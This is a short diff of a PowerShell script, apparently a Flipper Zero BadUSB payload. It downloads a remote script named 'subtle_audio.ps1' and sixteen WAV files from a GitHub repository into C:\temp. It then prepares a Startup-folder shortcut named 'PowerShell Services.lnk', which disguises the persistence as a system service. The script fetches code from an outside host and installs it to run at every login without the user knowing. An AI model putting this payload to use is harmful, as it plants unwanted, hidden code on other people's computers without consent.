@@ -1,7 +1,11 @@
 $FilePath = "C:\temp\subtle_audio.ps1"
 
-$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/exit_repeat.ps1"
+$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/subtle_audio/subtle_audio.ps1"
 Invoke-WebRequest $myDownloadUrl -OutFile $FilePath
+
+for (($i = 1); ($i -lt 17); ($i++)) {
+    Invoke-WebRequest "https://github.com/MattHinz03/Flipper-Scripts/raw/main/subtle_audio/$i.wav" -OutFile "C:\temp\$i.wav"
+}
 
 
 $ShortcutPath = "$([Environment]::GetFolderPath('Startup'))\PowerShell Services.lnk"
